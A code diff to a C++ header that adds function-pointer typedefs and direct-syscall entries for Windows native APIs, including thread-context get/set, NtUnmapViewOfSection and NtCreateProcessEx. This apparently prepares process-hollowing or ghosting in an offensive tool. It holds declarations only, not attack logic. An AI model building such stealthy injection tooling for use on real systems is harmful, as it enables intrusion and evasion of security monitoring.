@@ -39,8 +39,8 @@ namespace Procs
 
     // NtFlushInstructionCache
     typedef NTSTATUS (NTAPI* LPPROC_NTFLUSHINSTRUCTIONCACHE)(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Length);
-    // NtCreateProcess
-    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEPROCESS)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, BOOLEAN InheritObjectTable, HANDLE SectionHandle, HANDLE DebugPort, HANDLE TokenHandle);
+    // NtCreateProcessEx
+    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEPROCESSEX)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE TokenHandle, ULONG Reserved);
     // NtOpenProcess
     typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESS)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
     // NtOpenProcessToken
@@ -53,8 +53,14 @@ namespace Procs
     typedef NTSTATUS (NTAPI* LPPROC_NTCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
     // NtResumeThread
     typedef NTSTATUS (NTAPI* LPPROC_NTRESUMETHREAD)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
+    // NtGetContextThread
+    typedef NTSTATUS (NTAPI* LPPROC_NTGETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
+    // NtSetContextThread
+    typedef NTSTATUS (NTAPI* LPPROC_NTSETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
     // NtAllocateVirtualMemory
     typedef NTSTATUS (NTAPI* LPPROC_NTALLOCATEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+    // NtReadVirtualMemory
+    typedef NTSTATUS (NTAPI* LPPROC_NTREADVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
     // NtWriteVirtualMemory
     typedef NTSTATUS (NTAPI* LPPROC_NTWRITEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
     // NtProtectVirtualMemory
@@ -101,6 +107,8 @@ namespace Procs
     typedef NTSTATUS (NTAPI* LPPROC_NTQUERYKEY)(HANDLE KeyHandle, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength);
     // NtEnumerateValueKey
     typedef NTSTATUS (NTAPI* LPPROC_NTENUMERATEVALUEKEY)(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);
+    // NtUnmapViewOfSection
+    typedef NTSTATUS (NTAPI* LPPROC_NTUNMAPVIEWOFSECTION)(HANDLE ProcessHandle, PVOID BaseAddress);
 
     // **NATIVE APIs (RUNTIME LIBRARY)**
     // RtlAllocateHeap
@@ -145,6 +153,8 @@ namespace Procs
     typedef BOOL (WINAPI* LPPROC_VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
     // closeHandle
     typedef BOOL (WINAPI* LPPROC_CLOSEHANDLE)(HANDLE hObject);
+    // SetFileInformationByHandle
+    typedef BOOL (WINAPI* LPPROC_SETFILEINFORMATIONBYHANDLE)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);
     // MessageBoxA
     typedef int (WINAPI* LPPROC_MESSAGEBOXA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
     // WinHttpOpen
@@ -173,14 +183,17 @@ namespace Procs
     struct PROCS
     {
         // **NATIVE APIs**
-        LPPROC_NTCREATEPROCESS              lpNtCreateProcess                   = nullptr;
+        LPPROC_NTCREATEPROCESSEX            lpNtCreateProcessEx                 = nullptr;
         LPPROC_NTOPENPROCESS                lpNtOpenProcess                     = nullptr;
         LPPROC_NTOPENPROCESSTOKEN           lpNtOpenProcessToken                = nullptr;
         LPPROC_NTTERMINATEPROCESS           lpNtTerminateProcess                = nullptr;
         LPPROC_NTSETINFORMATIONPROCESS      lpNtSetInformationProcess           = nullptr;
         LPPROC_NTCREATETHREADEX             lpNtCreateThreadEx                  = nullptr;
         LPPROC_NTRESUMETHREAD               lpNtResumeThread                    = nullptr;
+        LPPROC_NTGETCONTEXTTHREAD           lpNtGetContextThread                = nullptr;
+        LPPROC_NTSETCONTEXTTHREAD           lpNtSetContextThread                = nullptr;
         LPPROC_NTALLOCATEVIRTUALMEMORY      lpNtAllocateVirtualMemory           = nullptr;
+        LPPROC_NTREADVIRTUALMEMORY          lpNtReadVirtualMemory               = nullptr;
         LPPROC_NTWRITEVIRTUALMEMORY         lpNtWriteVirtualMemory              = nullptr;
         LPPROC_NTPROTECTVIRTUALMEMORY       lpNtProtectVirtualMemory            = nullptr;
         LPPROC_NTFREEVIRTUALMEMORY          lpNtFreeVirtualMemory               = nullptr;
@@ -204,6 +217,7 @@ namespace Procs
         LPPROC_NTOPENKEYEX                  lpNtOpenKeyEx                       = nullptr;
         LPPROC_NTQUERYKEY                   lpNtQueryKey                        = nullptr;
         LPPROC_NTENUMERATEVALUEKEY          lpNtEnumerateValueKey               = nullptr;
+        LPPROC_NTUNMAPVIEWOFSECTION         lpNtUnmapViewOfSection              = nullptr;
 
         // **RUNTIME LIBRARY APIs**
         LPPROC_RTLALLOCATEHEAP              lpRtlAllocateHeap                   = nullptr;
@@ -219,6 +233,7 @@ namespace Procs
 
         // **WINAPIs**
         LPPROC_QUERYFULLPROCESSIMAGENAMEW   lpQueryFullProcessImageNameW        = nullptr;
+        LPPROC_SETFILEINFORMATIONBYHANDLE   lpSetFileInformationByHandle        = nullptr;
         LPPROC_WINHTTPOPEN                  lpWinHttpOpen                       = nullptr;
         LPPROC_WINHTTPCONNECT               lpWinHttpConnect                    = nullptr;
         LPPROC_WINHTTPOPENREQUEST           lpWinHttpOpenRequest                = nullptr;
@@ -232,14 +247,17 @@ namespace Procs
         LPPROC_WINHTTPCLOSEHANDLE           lpWinHttpCloseHandle                = nullptr;
 
         // **SYSCALLS**
-        Syscalls::SYSCALL                   sysNtCreateProcess                  = {0};
+        Syscalls::SYSCALL                   sysNtCreateProcessEx                = {0};
         Syscalls::SYSCALL                   sysNtOpenProcess                    = {0};
         Syscalls::SYSCALL                   sysNtOpenProcessToken               = {0};
         Syscalls::SYSCALL                   sysNtTerminateProcess               = {0};
         Syscalls::SYSCALL                   sysNtSetInformationProcess          = {0};
         Syscalls::SYSCALL                   sysNtCreateThreadEx                 = {0};
         Syscalls::SYSCALL                   sysNtResumeThread                   = {0};
+        Syscalls::SYSCALL                   sysNtGetContextThread               = {0};
+        Syscalls::SYSCALL                   sysNtSetContextThread               = {0};
         Syscalls::SYSCALL                   sysNtAllocateVirtualMemory          = {0};
+        Syscalls::SYSCALL                   sysNtReadVirtualMemory              = {0};
         Syscalls::SYSCALL                   sysNtWriteVirtualMemory             = {0};
         Syscalls::SYSCALL                   sysNtProtectVirtualMemory           = {0};
         Syscalls::SYSCALL                   sysNtFreeVirtualMemory              = {0};
@@ -263,6 +281,7 @@ namespace Procs
         Syscalls::SYSCALL                   sysNtOpenKeyEx                      = {0};
         Syscalls::SYSCALL                   sysNtQueryKey                       = {0};
         Syscalls::SYSCALL                   sysNtEnumerateValueKey              = {0};
+        Syscalls::SYSCALL                   sysNtUnmapViewOfSection             = {0};
 
         Syscalls::SYSCALL                   sysRtlAllocateHeap                  = {0};
         Syscalls::SYSCALL                   sysRtlInitUnicodeString             = {0};
